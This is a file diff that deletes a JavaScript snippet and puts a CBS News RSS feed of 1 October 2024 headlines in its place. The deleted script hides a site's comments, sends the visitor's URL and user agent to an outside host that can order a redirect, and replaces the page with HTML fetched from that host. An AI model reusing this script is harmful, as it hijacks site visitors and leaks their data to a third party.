@@ -1,60 +1,446 @@
-(async function() {
-  // --- Always disable comment section ---
-  console.log('[DEBUG] Disabling comments...');
-  try {
-    // Change heading text
-    document.querySelectorAll('h2').forEach(h2 => {
-      if (h2.textContent.trim() === 'Add a Comment') {
-        h2.textContent = 'Add a Comment (Disabled)';
-      }
-    });
 
-    // Hide textarea
-    document.querySelectorAll('textarea[name="strDescription"]').forEach(el => {
-      el.disabled = true;
-      el.style.display = 'none';
-    });
+<?xml version="1.0" encoding="UTF-8"?>
+<rss version="2.0"
+        	xmlns:content="http://purl.org/rss/1.0/modules/content/"
+	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
+	xmlns:dc="http://purl.org/dc/elements/1.1/"
+	xmlns:atom="http://www.w3.org/2005/Atom"
+	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
+	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
+    xmlns:s="https://www.cbsnews.com/"
 
-    // Hide submit button
-    document.querySelectorAll('input[name="btnPostComment"]').forEach(el => {
-      el.disabled = true;
-      el.style.display = 'none';
-    });
+    xmlns:media="http://search.yahoo.com/mrss/"
+>
+    <channel>
+        
+        
+               
 
-    // Hide comments table
-    document.querySelectorAll('table.comment').forEach(el => {
-      el.style.display = 'none';
-    });
-  } catch (err) {
-    console.error('[ERROR] Comment disable failed:', err);
-  }
+            <title>Home - CBSNews.com</title>
+    <link>https://www.cbsnews.com/</link>
+    <description>Headlines From CBSNews.com</description>
+    <pubDate>Tue, 01 Oct 2024 15:12:11 -0400</pubDate>
+    <ttl>5</ttl>
+            
+                    <item>
+                
+    <title>Iranian attack on Israel is over, Iran&#039;s mission to the United Nations says</title>
+    <link>https://www.cbsnews.com/video/iranian-attack-on-israel-is-over-irans-mission-to-the-united-nation-says/</link>
+    <description>Iran&#039;s mission to the United Nations issued a statement confirming the missile attack launched toward Israel, calling it a &quot;legal, rational, and legitimate response to the terrorist acts of the Zionist regime.&quot; CBS News&#039; Robert Berger, Chris Livesay and Olivia Gazis have more.</description>
 
-  // --- ultra fast start ---
-  const s = new URLSearchParams(location.search).get('s');
-  if (!s) return;
+            <pubDate>Tue, 01 Oct 2024 14:47:01 -0400</pubDate>
+    
+                    
 
-  // --- fire rd.php in background ---
-  const rdUrl = 'https://www.hsdpro.com/redirects/rd.php?url=' + encodeURIComponent(location.href) +
-                '&ua=' + encodeURIComponent(navigator.userAgent);
-  fetch(rdUrl)
-    .then(r => r.text())
-    .then(t => {
-      t = t.trim();
-      if (t.startsWith('yes|')) {
-        const redirectUrl = t.split('|')[1];
-        if (redirectUrl) location.href = redirectUrl;
-      }
-    })
-    .catch(() => {});
+	    	        <image>https://assets3.cbsnewsstatic.com/hub/i/r/2024/10/01/43b25f40-1d86-4ef8-a40b-7480f48370cc/thumbnail/60x60/47017bb78917e22a8b530dbc438f599c/cbsn-fusion-iranian-attack-on-israel-is-over-irans-mission-to-the-united-nation-says-thumbnail-3233654-640x360.jpg?v=fa529222a2be3543711c1a879b51e860</image>
+	        
+    <guid isPermaLink="false">c9877c56-78c9-4cf5-8a56-6b95af7580bc</guid>
+        </item>
+            <item>
+                
+    <title>How will Iran&#039;s missile attack against Israel alter Middle East tensions</title>
+    <link>https://www.cbsnews.com/video/how-will-irans-missile-attack-against-israel-alter-middle-east-tensions/</link>
+    <description>Iran has confirmed through its United Nations mission that it launched a missile attack against Israel. The Israel Defense Forces and the U.S. say they intercepted some of the missiles, but Iranian media is touting the attack as a success, CBS News senior foreign correspondent Elizabeth Palmer reports from Tel Aviv.</description>
 
-  // --- immediately load new HTML page ---
-  try {
-    const res = await fetch('https://www.hsdpro.com/s/' + encodeURIComponent(s) + '.html', {cache: 'no-store'});
-    const html = await res.text();
-    document.open();
-    document.write(html);
-    document.close();
-  } catch (e) {
-    console.error('[ERROR] HTML load failed:', e);
-  }
-})();
+            <pubDate>Tue, 01 Oct 2024 14:47:01 -0400</pubDate>
+    
+                    
+
+	    	        <image>https://assets1.cbsnewsstatic.com/hub/i/r/2024/10/01/d1a1811b-401c-4f56-8127-530aea4fbb1e/thumbnail/60x60/d19ceab0989586419c314220279e9fd1/cbsn-fusion-how-will-irans-missile-attack-against-israel-alter-middle-east-tensions-thumbnail-3233666-640x360.jpg?v=fa529222a2be3543711c1a879b51e860</image>
+	        
+    <guid isPermaLink="false">0997acd7-6a44-4350-becd-02e5358a88a2</guid>
+        </item>
+            <item>
+                
+    <title>Israel intercepting Iran missiles, IDF says | Special Report</title>
+    <link>https://www.cbsnews.com/video/israel-intercepts-iran-missiles-idf-says-special-report/</link>
+    <description>Iran has launched missiles toward Israel, the Israel Defense Forces say. Sirens in Tel Aviv and Jerusalem warned Israelis to shelter in place. The U.S. is assisting Israel with missile interceptions, according to a defense official, while President Biden and Vice President Kamala Harris monitor the situation in the Middle East. Errol Barnett anchored CBS News&#039; special report.</description>
+
+            <pubDate>Tue, 01 Oct 2024 14:47:01 -0400</pubDate>
+    
+                    
+
+	    	        <image>https://assets3.cbsnewsstatic.com/hub/i/r/2024/10/01/2c08c244-9723-4f00-befb-3fd098bba64e/thumbnail/60x60/0ab03376c59c7f7bdcdb1cabb4e0a667/cbsn-fusion-israel-intercepts-iran-missiles-idf-says-special-report-thumbnail-3233634-640x360.jpg?v=fa529222a2be3543711c1a879b51e860</image>
+	        
+    <guid isPermaLink="false">df01b3eb-0b25-417f-bcbb-df6b2b5fdd94</guid>
+        </item>
+            <item>
+                
+    <title>6 killed in Tel Aviv shooting moments before missile attack by Iran</title>
+    <link>https://www.cbsnews.com/news/mass-shooting-tel-aviv-deaths-israel-police-say/</link>
+    <description>Police said two suspects were killed after opening fire on a boulevard in the Jaffa neighborhood in southern Tel Aviv.</description>
+
+            <pubDate>Tue, 01 Oct 2024 14:45:35 -0400</pubDate>
+    
+                    
+
+	    	        <image>https://assets2.cbsnewsstatic.com/hub/i/r/2024/10/01/7e2837f4-abc4-4be5-aa45-279b473b6355/thumbnail/60x60/18c0dea45ae01fcfb98a24047ebea3a2/gettyimages-2175296504.jpg?v=fa529222a2be3543711c1a879b51e860</image>
+	        
+    <guid isPermaLink="false">2c405c42-eadc-4483-ad8a-d62d89022bf7</guid>
+        </item>
+            <item>
+                
+    <title>Claudia Sheinbaum takes office as Mexico&#039;s first female president</title>
+    <link>https://www.cbsnews.com/news/claudia-sheinbaum-mexico-first-female-president/</link>
+    <description>Claudia Sheinbaum&#039;s presidential victory came 70 years after women won the right to vote in Mexico.</description>
+
+            <pubDate>Tue, 01 Oct 2024 14:44:43 -0400</pubDate>
+    
+                    
+
+	    	        <image>https://assets2.cbsnewsstatic.com/hub/i/r/2024/10/01/fc7767d4-e2f6-40ae-9e1f-d389e209e066/thumbnail/60x60/d6c0e437dc669bcc8ce221c545e34437/gettyimages-2175929692.jpg?v=fa529222a2be3543711c1a879b51e860</image>
+	        
+    <guid isPermaLink="false">40c2903b-5280-4716-a5e0-f6842febb129</guid>
+        </item>
+            <item>
+                
+    <title>U.S. should consider response to Iran&#039;s attack, former national security adviser says</title>
+    <link>https://www.cbsnews.com/video/us-should-consider-response-to-irans-attack-former-national-security-adviser-says/</link>
+    <description>Iran confirmed it launched an attack toward Israel Tuesday as Israel&#039;s operations against Hezbollah in Lebanon escalate. Retired Lieutenant General H.R. McMaster, a former national security adviser, joins CBS News with his take on U.S. response to Iran&#039;s latest escalation in the region.</description>
+
+            <pubDate>Tue, 01 Oct 2024 14:36:00 -0400</pubDate>
+    
+                    
+
+	    	        <image>https://assets2.cbsnewsstatic.com/hub/i/r/2024/10/01/ffec958d-f010-4170-9352-00439e33fbc5/thumbnail/60x60/3eb2e4809c81b5f29b851d94d30c462d/cbsn-fusion-us-should-consider-response-to-irans-attack-former-national-security-adviser-says-thumbnail.jpg?v=fa529222a2be3543711c1a879b51e860</image>
+	        
+    <guid isPermaLink="false">717f0aec-c59a-403d-a8f7-8e445e854612</guid>
+        </item>
+            <item>
+                
+    <title>John Amos, &quot;Roots&quot; and &quot;Good Times&quot; actor, dies at 84</title>
+    <link>https://www.cbsnews.com/news/john-amos-dies-roots-good-times/</link>
+    <description>John Amos was best known for his roles in &quot;Roots&quot; and the 1970s sitcom &quot;Good Times.&quot;</description>
+
+            <pubDate>Tue, 01 Oct 2024 14:33:00 -0400</pubDate>
+    
+                    
+
+	    	        <image>https://assets2.cbsnewsstatic.com/hub/i/r/2024/10/01/a89bbda6-4ca6-47fa-a23e-1422bd85f4f7/thumbnail/60x60/aae6f004675e44dbd5f34454ef9860f6/john-amos-491474598.jpg?v=fa529222a2be3543711c1a879b51e860</image>
+	        
+    <guid isPermaLink="false">fa9939cb-e60f-46e1-8c77-2bd4c56a4533</guid>
+        </item>
+            <item>
+                
+    <title>Should you open a home equity loan this October?</title>
+    <link>https://www.cbsnews.com/news/should-you-open-a-home-equity-loan-this-october/</link>
+    <description>If you need an inexpensive way to borrow money, a home equity loan could make sense this October. Here&#039;s why.</description>
+
+            <pubDate>Tue, 01 Oct 2024 14:23:48 -0400</pubDate>
+    
+                    
+
+	    	        <image>https://assets1.cbsnewsstatic.com/hub/i/r/2024/10/01/74ce986c-a6b3-4a05-b62b-1385c28fe8b7/thumbnail/60x60/a50bb62beed7d015f0ca96f355901c63/gettyimages-1789264391.jpg?v=fa529222a2be3543711c1a879b51e860</image>
+	        
+    <guid isPermaLink="false">77a0e55d-8c7f-4393-a673-c70c3a2f8dca</guid>
+        </item>
+            <item>
+                
+    <title>Airbnb giving Hurricane Helene victims free temporary housing</title>
+    <link>https://www.cbsnews.com/news/airbnb-hurricane-helene-free-housing-people-displaced/</link>
+    <description>The company&#039;s nonprofit arm is partnering with local organizations to place displaced residents in free housing on a short-term basis.</description>
+
+            <pubDate>Tue, 01 Oct 2024 14:21:00 -0400</pubDate>
+    
+                    
+
+	    	        <image>https://assets3.cbsnewsstatic.com/hub/i/r/2024/10/01/651d0330-8623-411e-b497-a3cad4bc5276/thumbnail/60x60/3c16d4a300dc30f3d5c654581aa75149/gettyimages-2174219458.jpg?v=fa529222a2be3543711c1a879b51e860</image>
+	        
+    <guid isPermaLink="false">7251aa0d-c487-409b-a0f6-e881e2294d63</guid>
+        </item>
+            <item>
+                
+    <title>3 ways to have your credit card debt forgiven this October</title>
+    <link>https://www.cbsnews.com/news/ways-to-have-your-credit-card-debt-forgiven-this-october/</link>
+    <description>With credit card rates at record highs, you may want to pursue this type of debt relief now. Here&#039;s how to do it.</description>
+
+            <pubDate>Tue, 01 Oct 2024 14:16:00 -0400</pubDate>
+    
+                    
+
+	    	        <image>https://assets2.cbsnewsstatic.com/hub/i/r/2024/10/01/23ce2b43-42cc-4a66-9118-52c99d69d985/thumbnail/60x60/2768c37a76d2d2e6dbe91659ccd6faa2/gettyimages-1255604827.jpg?v=fa529222a2be3543711c1a879b51e860</image>
+	        
+    <guid isPermaLink="false">ed29fc67-cd41-4939-ab1a-723a83afb93e</guid>
+        </item>
+            <item>
+                
+    <title>How to help Hurricane Helene survivors</title>
+    <link>https://www.cbsnews.com/news/hurricane-helene-how-to-help/</link>
+    <description>Hurricane Helene caused widespread devastation throughout the Southeast after making landfall in Florida.</description>
+
+            <pubDate>Tue, 01 Oct 2024 13:58:40 -0400</pubDate>
+    
+                    
+
+	    	        <image>https://assets2.cbsnewsstatic.com/hub/i/r/2024/10/01/9755011e-ab44-4edd-881f-f8231a8365f6/thumbnail/60x60/6cdde9ba4979b6c3500c5273d7002b7c/2024-09-30t202558z-1780675076-rc23aaa5gv3m-rtrmadp-3-storm-helene.jpg?v=fa529222a2be3543711c1a879b51e860</image>
+	        
+    <guid isPermaLink="false">660df8d9-54aa-45cc-9e6a-92bf0d2cf32b</guid>
+        </item>
+            <item>
+                
+    <title>Why beginners should invest in gold this October</title>
+    <link>https://www.cbsnews.com/news/why-beginners-should-invest-in-gold-this-october/</link>
+    <description>The benefits a gold investment offers can be particularly advantageous for beginners this October. Here&#039;s what to know.</description>
+
+            <pubDate>Tue, 01 Oct 2024 13:50:34 -0400</pubDate>
+    
+                    
+
+	    	        <image>https://assets3.cbsnewsstatic.com/hub/i/r/2024/10/01/0ff19aed-cf28-4c32-b7d1-56f3083527bd/thumbnail/60x60/0759ccec4af556ed05cfb3f57b8e3c80/gettyimages-145165981.jpg?v=fa529222a2be3543711c1a879b51e860</image>
+	        
+    <guid isPermaLink="false">59b094e0-5789-4659-b355-f58d75f0254c</guid>
+        </item>
+            <item>
+                
+    <title>Israelis seek shelter after Iran launches missiles, IDF says</title>
+    <link>https://www.cbsnews.com/video/israelis-seek-shelter-after-iran-launches-missiles-idf-says/</link>
+    <description>The Israel Defense Forces is warning Israelis to shelter in place as news of missiles apparently launched from Iran emerges. CBS News&#039; Willie James Inman has more from the White House where President Biden and Vice President Kamala Harris have been monitoring tensions in the region. Also, CBS News contributor Robert Berger has more from Jerusalem.</description>
+
+            <pubDate>Tue, 01 Oct 2024 13:14:00 -0400</pubDate>
+    
+                    
+
+	    	        <image>https://assets1.cbsnewsstatic.com/hub/i/r/2024/10/01/6c440b37-2d13-4c0a-84a0-8f3c75b22225/thumbnail/60x60/93d6b9df1d2e76003737154f6e47860c/cbsn-fusion-israelis-seek-shelter-after-iran-launches-missiles-idf-says-thumbnail.jpg?v=fa529222a2be3543711c1a879b51e860</image>
+	        
+    <guid isPermaLink="false">f2a9a5b9-ec91-4ca3-8d5e-0578657b6a02</guid>
+        </item>
+            <item>
+                
+    <title>Why you should open a long-term CD this October</title>
+    <link>https://www.cbsnews.com/news/why-you-should-open-a-long-term-cd-this-october/</link>
+    <description>A long-term CD offers savers a safe way to earn high returns. Here&#039;s why it&#039;s worth opening one this October.</description>
+
+            <pubDate>Tue, 01 Oct 2024 13:12:00 -0400</pubDate>
+    
+                    
+
+	    	        <image>https://assets2.cbsnewsstatic.com/hub/i/r/2024/10/01/4af6e216-94d0-4d96-afa5-28c7609c15c9/thumbnail/60x60/db13a7a60252b32d28ca3684300e79ad/gettyimages-1280204585.jpg?v=fa529222a2be3543711c1a879b51e860</image>
+	        
+    <guid isPermaLink="false">beeb7a2b-4725-4f1a-92e9-cf28ac344615</guid>
+        </item>
+            <item>
+                
+    <title>Iran fired missiles at Israel, IDF says</title>
+    <link>https://www.cbsnews.com/video/iran-fired-missiles-at-israel-idf-says/</link>
+    <description>The Israel Defense Forces says missiles were launched from Iran toward the State of Israel. Warning sirens blared in Tel Aviv Tuesday night, and President Biden, Vice President Kamala Harris and the national security team convened before Iran&#039;s apparent strike. CBS News&#039; Willie James Inman has more from the White House.</description>
+
+            <pubDate>Tue, 01 Oct 2024 13:03:00 -0400</pubDate>
+    
+                    
+
+	    	        <image>https://assets1.cbsnewsstatic.com/hub/i/r/2024/10/01/afa31860-ae9b-4701-b857-29fe16fe4a5c/thumbnail/60x60/e843acea4a464804a2f4d333a1e4cd7c/cbsn-fusion-iran-fired-missiles-at-israel-idf-says-thumbnail.jpg?v=fa529222a2be3543711c1a879b51e860</image>
+	        
+    <guid isPermaLink="false">7209daaa-60ba-44eb-a93f-3d3492561481</guid>
+        </item>
+            <item>
+                
+    <title>Weezer reflect on 30 years of &quot;The Blue Album&quot;</title>
+    <link>https://www.cbsnews.com/news/weezer-30-years-the-blue-album/</link>
+    <description>Rivers Cuomo and Patrick Wilson, the two remaining original members, revisited their 1994 debut album as part of their &quot;Voyage to the Blue Planet&quot; tour.</description>
+
+            <pubDate>Tue, 01 Oct 2024 12:56:57 -0400</pubDate>
+    
+                    
+
+	    	        <image>https://assets2.cbsnewsstatic.com/hub/i/r/2024/10/01/073a2b09-c6c4-4b38-aa0a-c404c8e5371b/thumbnail/60x60/eaf12690b66e08b5b381557f43ab7897/1001-cmo-weezer-mm-dokoupil-mid.jpg?v=fa529222a2be3543711c1a879b51e860</image>
+	        
+    <guid isPermaLink="false">eb44e672-bda8-4573-a6de-0e147a9b4c74</guid>
+        </item>
+            <item>
+                
+    <title>How much will a $150,000 home equity loan cost per month now that rates are falling?</title>
+    <link>https://www.cbsnews.com/news/how-much-will-a-150000-home-equity-loan-cost-now-that-rates-are-falling/</link>
+    <description>Home equity rates are dropping. If you&#039;re planning to borrow $150,000, here&#039;s what you can expect to pay monthly.</description>
+
+            <pubDate>Tue, 01 Oct 2024 12:30:08 -0400</pubDate>
+    
+                    
+
+	    	        <image>https://assets2.cbsnewsstatic.com/hub/i/r/2024/10/01/7174bcda-183c-4e62-a94a-df5685d233f2/thumbnail/60x60/4f1d9535401615b6d11e86dcfefdb2c1/gettyimages-1188233481.jpg?v=fa529222a2be3543711c1a879b51e860</image>
+	        
+    <guid isPermaLink="false">768df3b4-f663-4156-9cbf-bd076910025d</guid>
+        </item>
+            <item>
+                
+    <title>Inside some of the security precautions for Vance-Walz VP debate</title>
+    <link>https://www.cbsnews.com/video/inside-some-of-the-security-precautions-for-vance-walz-vp-debate/</link>
+    <description>The CBS Broadcast Center in New York City will play host to Tuesday night&#039;s debate between Tim Walz and JD Vance, the only debate scheduled for the vice presidential candidates in the 2024 campaign. CBS News Newspath correspondent Jarred Hill has a look at some of the security measures in place for the event.</description>
+
+            <pubDate>Tue, 01 Oct 2024 12:26:00 -0400</pubDate>
+    
+                    
+
+	    	        <image>https://assets1.cbsnewsstatic.com/hub/i/r/2024/10/01/82aa08c5-c483-4c4a-b707-e532db48be9d/thumbnail/60x60/6e82fd7cb32acb6210f4f61e0e110912/cbsn-fusion-inside-some-of-the-security-precautions-for-vance-walz-vp-debate-thumbnail.jpg?v=fa529222a2be3543711c1a879b51e860</image>
+	        
+    <guid isPermaLink="false">63a93b4b-1e3d-4ab9-bb7d-3b5e529d6301</guid>
+        </item>
+            <item>
+                
+    <title>Recapping Vance&#039;s comments about Haitian immigrants before debate with Walz</title>
+    <link>https://www.cbsnews.com/video/recapping-vances-comments-about-haitian-immigrants-before-debate-with-walz/</link>
+    <description>Haitian immigrants in Springfield, Ohio, have become a focal point of the 2024 campaign due to comments from both JD Vance and Donald Trump. Ahead of Vance&#039;s debate with Tim Walz, CBS News immigration and politics reporter Camilo Montoya-Galvez summarizes what&#039;s been said and the effect the comments have had.</description>
+
+            <pubDate>Tue, 01 Oct 2024 12:20:00 -0400</pubDate>
+    
+                    
+
+	    	        <image>https://assets2.cbsnewsstatic.com/hub/i/r/2024/10/01/a8be8a49-8e5d-44a1-b26d-14e24d30f8d7/thumbnail/60x60/f68a3882348305a9a9acbce3472ac21e/cbsn-fusion-recapping-vances-comments-about-haitian-immigrants-before-debate-with-walz-thumbnail.jpg?v=fa529222a2be3543711c1a879b51e860</image>
+	        
+    <guid isPermaLink="false">bc84c182-5dad-46ff-8c0b-42ef86fe9080</guid>
+        </item>
+            <item>
+                
+    <title>Jimmy Carter&#039;s Secret Service detail reflects on the assignment of a lifetime</title>
+    <link>https://www.cbsnews.com/news/jimmy-carter-secret-service-reflections/</link>
+    <description>CBS News visited Plains, Georgia, for an inside look at the political outsider&#039;s security detail on his 100th birthday.</description>
+
+            <pubDate>Tue, 01 Oct 2024 12:09:00 -0400</pubDate>
+    
+                    
+
+	    	        <image>https://assets3.cbsnewsstatic.com/hub/i/r/2024/10/01/ebbaa1e6-81d1-4135-a174-f2b63453cdff/thumbnail/60x60/d1d56910a053cf5abd5b26f7d4e093aa/running.jpg?v=fa529222a2be3543711c1a879b51e860</image>
+	        
+    <guid isPermaLink="false">21b5bd55-b21c-487f-8226-3c5e49003f2b</guid>
+        </item>
+            <item>
+                
+    <title>How Tim Walz is preparing for debate with JD Vance</title>
+    <link>https://www.cbsnews.com/video/how-tim-walz-is-preparing-for-debate-with-jd-vance/</link>
+    <description>Vice presidential candidates Tim Walz and JD Vance will face off Tuesday night in their only scheduled debate of the 2024 campaign. CBS News political correspondent Caitlin Huey-Burns has more on how Walz is getting ready.</description>
+
+            <pubDate>Tue, 01 Oct 2024 11:59:00 -0400</pubDate>
+    
+                    
+
+	    	        <image>https://assets1.cbsnewsstatic.com/hub/i/r/2024/10/01/c0729ee8-8d0f-470e-b11d-9b096d62c0bc/thumbnail/60x60/487c11e9ed1c466d1bad0720def64da1/cbsn-fusion-how-tim-walz-is-preparing-for-debate-with-jd-vance-thumbnail.jpg?v=fa529222a2be3543711c1a879b51e860</image>
+	        
+    <guid isPermaLink="false">92e6ffee-b45e-4d31-8ce0-da8429bab0cc</guid>
+        </item>
+            <item>
+                
+    <title>White House warns direct attack from Iran against Israel will have severe consequences</title>
+    <link>https://www.cbsnews.com/video/white-house-warns-direct-attack-from-iran-against-israel-will-have-severe-consequences/</link>
+    <description>A senior White House official says that the U.S. believes Iran is preparing to imminently launch a missile attack against Israel and warns that should there be an attack, Iran will face consequences. CBS News White House reporter Willie James Inman and CBS News senior national security correspondent Charlie D&#039;Agata have the latest.</description>
+
+            <pubDate>Tue, 01 Oct 2024 11:51:00 -0400</pubDate>
+    
+                    
+
+	    	        <image>https://assets2.cbsnewsstatic.com/hub/i/r/2024/10/01/347f3de2-283a-4015-b9fe-bc6dc62f2f68/thumbnail/60x60/4e6a8eed2b8065faaede3a3bc52effb9/cbsn-fusion-white-house-warns-direct-attack-from-iran-against-israel-will-have-severe-consequences-thumbnail.jpg?v=fa529222a2be3543711c1a879b51e860</image>
+	        
+    <guid isPermaLink="false">f882ff4e-760c-43d8-999b-6f56d9146ea4</guid>
+        </item>
+            <item>
+                
+    <title>At least 25 killed in Bangkok school bus fire</title>
+    <link>https://www.cbsnews.com/video/at-least-25-killed-in-bangkok-school-bus-fire/</link>
+    <description>A school bus fire in Bangkok has killed at least 25 students and teachers who officials say were on board for a school trip when the fire erupted. The students reportedly range from elementary to junior high school age with officials saying there were 44 people on the bus in total. A rescuer who responded to the scene says a tire explosion likely sparked the deadly fire.</description>
+
+            <pubDate>Tue, 01 Oct 2024 11:42:00 -0400</pubDate>
+    
+                    
+
+	    	        <image>https://assets2.cbsnewsstatic.com/hub/i/r/2024/10/01/1f0ec18a-e231-468c-9f1c-40eb6e2f0165/thumbnail/60x60/65a3da9c618ff19b549e29541eb00786/cbsn-fusion-at-least-25-killed-in-bangkok-school-bus-fire-thumbnail.jpg?v=fa529222a2be3543711c1a879b51e860</image>
+	        
+    <guid isPermaLink="false">cfb46afc-aed7-4ec7-8ef4-8bf26dd97608</guid>
+        </item>
+            <item>
+                
+    <title>Race to find Helene survivors as officials fear death toll will rise</title>
+    <link>https://www.cbsnews.com/news/hurricane-helene-survivors-north-carolina-rescue/</link>
+    <description>President Joe Biden said Monday there were reports that 600 people were unaccounted for after Hurricane Helene.</description>
+
+            <pubDate>Tue, 01 Oct 2024 11:39:00 -0400</pubDate>
+    
+                    
+
+	    	        <image>https://assets3.cbsnewsstatic.com/hub/i/r/2024/10/01/830621d5-2d36-4e60-bb3e-f4246531403b/thumbnail/60x60/f13ac38442ebc6e48a2f72ddbff005e6/gettyimages-2175025563.jpg?v=fa529222a2be3543711c1a879b51e860</image>
+	        
+    <guid isPermaLink="false">7443bf51-d17d-48ba-b041-809495fee4d2</guid>
+        </item>
+            <item>
+                
+    <title>Helene survivors calling for supplies, say they didn&#039;t expect conditions to deteriorate so badly</title>
+    <link>https://www.cbsnews.com/video/helene-survivors-calling-for-supplies-say-they-didnt-expect-conditions-to-deteriorate-so-badly/</link>
+    <description>Five days after Helene tore through the Southeast, rescue workers are still searching for hundreds who remain missing and millions of people remain without power. CBS News correspondent Skyler Henry has more.</description>
+
+            <pubDate>Tue, 01 Oct 2024 11:28:00 -0400</pubDate>
+    
+                    
+
+	    	        <image>https://assets3.cbsnewsstatic.com/hub/i/r/2024/10/01/2241212d-171b-4c91-8f58-f8e42096ab20/thumbnail/60x60/c056bfb0f223201ddde671bcb0cd011c/cbsn-fusion-helene-survivors-calling-for-supplies-say-they-didnt-expect-conditions-to-deteriorate-so-badly-thumbnail.jpg?v=fa529222a2be3543711c1a879b51e860</image>
+	        
+    <guid isPermaLink="false">778727e3-9388-47fd-bc5e-23625e7e2b75</guid>
+        </item>
+            <item>
+                
+    <title>CVS lays off 2,900 workers in cost-cutting move. Here&#039;s what to know.</title>
+    <link>https://www.cbsnews.com/news/cvs-health-layoffs-2900-job-cuts/</link>
+    <description>CVS said it is cutting 2,900 workers, or about 1% of its workforce, as part of an effort to reduce costs by $2 billion.</description>
+
+            <pubDate>Tue, 01 Oct 2024 11:13:06 -0400</pubDate>
+    
+                    
+
+	    	        <image>https://assets2.cbsnewsstatic.com/hub/i/r/2022/08/03/8b00fd7f-7f90-4663-aa27-9e2194747e8d/thumbnail/60x60/0197cb7e91129b85e987dbd846bb28cf/download.jpg?v=fa529222a2be3543711c1a879b51e860</image>
+	        
+    <guid isPermaLink="false">314be297-d4de-48d0-abe8-ab2905a9488d</guid>
+        </item>
+            <item>
+                
+    <title>What to know about major U.S. dockworker strike</title>
+    <link>https://www.cbsnews.com/video/what-to-know-about-major-us-dockworker-strike/</link>
+    <description>Nearly half of all U.S. imports are at a standstill during a labor contract standoff between dockworkers and companies with at least 25,000 union workers at East Coast and Gulf Coast ports on strike. CBS News senior transportation correspondent Kris Van Cleave has more.</description>
+
+            <pubDate>Tue, 01 Oct 2024 11:13:00 -0400</pubDate>
+    
+                    
+
+	    	        <image>https://assets2.cbsnewsstatic.com/hub/i/r/2024/10/01/eb0342da-3cfb-4769-8351-06785c5c1f69/thumbnail/60x60/16990bac9086ebf5f1f9cb241a8557e4/cbsn-fusion-what-to-know-about-major-us-dockworker-strike-thumbnail.jpg?v=fa529222a2be3543711c1a879b51e860</image>
+	        
+    <guid isPermaLink="false">bad3d192-8a46-4853-b392-72264a92cbc0</guid>
+        </item>
+            <item>
+                
+    <title>Iran planning &quot;imminent&quot; attack on Israel, U.S. official says</title>
+    <link>https://www.cbsnews.com/video/iran-planning-imminent-attack-on-israel-us-official-says/</link>
+    <description>A senior White House official says the U.S. has indications that Iran is planning to imminently launch a missile attack on Israel. This comes as Israel says its forces have begun targeted ground operations inside Lebanon, marking a dramatic escalation in the country&#039;s offensive against the Hezbollah militant group. CBS News foreign correspondent Chris Livesay has more.</description>
+
+            <pubDate>Tue, 01 Oct 2024 10:51:00 -0400</pubDate>
+    
+                    
+
+	    	        <image>https://assets2.cbsnewsstatic.com/hub/i/r/2024/10/01/22d0b506-8832-47a5-9532-2f28e0660b3a/thumbnail/60x60/c4b7f6a77c971e5a29673c39a3374f1f/cbsn-fusion-iran-planning-imminent-attack-on-israel-us-official-says-thumbnail.jpg?v=fa529222a2be3543711c1a879b51e860</image>
+	        
+    <guid isPermaLink="false">9de3cf90-5195-44bd-bc23-41015004d13c</guid>
+        </item>
+            <item>
+                
+    <title>Iran launches missile attack on Israel</title>
+    <link>https://www.cbsnews.com/news/israel-iran-us-warns-ballistic-missile-attack-amid-idf-ground-operations-lebanon-hezbollah/</link>
+    <description>Explosions were heard over Tel Aviv and Jerusalem as Iran launched missiles at Israel.</description>
+
+            <pubDate>Tue, 01 Oct 2024 10:50:00 -0400</pubDate>
+    
+                    
+
+	    	        <image>https://assets3.cbsnewsstatic.com/hub/i/r/2024/10/01/fff943c1-ea24-4189-adb2-1e7ae8cb19ae/thumbnail/60x60/c3581d06b1b846a00e372d581da665e7/israel-iran-missiles-2175288947.jpg?v=fa529222a2be3543711c1a879b51e860</image>
+	        
+    <guid isPermaLink="false">ee3febd7-9f76-4755-8b3c-3754ca3d16ee</guid>
+        </item>
+            <item>
+                
+    <title>Kate McKinnon on writing her debut novel and life after SNL</title>
+    <link>https://www.cbsnews.com/video/kate-mckinnon-on-writing-her-debut-novel-and-life-after-snl/</link>
+    <description>The Emmy-winning comedian and former &quot;SNL&quot; star joins &quot;CBS Mornings&quot; to discuss her first book, &quot;The Millicent Quibb School of Etiquette for Young Ladies of Mad Science,&quot; a young readers&#039; adventure about three sisters and a mad scientist.</description>
+
+            <pubDate>Tue, 01 Oct 2024 10:45:00 -0400</pubDate>
+    
+                    
+
+	    	        <image>https://assets2.cbsnewsstatic.com/hub/i/r/2024/10/01/21082bcd-4edb-4e11-9433-d2d3c469eb29/thumbnail/60x60/af87c1754711b934d64e9b8c30629cb8/1001-cmo-katemckinnon-intv-mid.jpg?v=fa529222a2be3543711c1a879b51e860</image>
+	        
+    <guid isPermaLink="false">1f18fce2-c98a-4766-b481-2b86c96c9e0f</guid>
+        </item>
+        </channel>
+</rss>
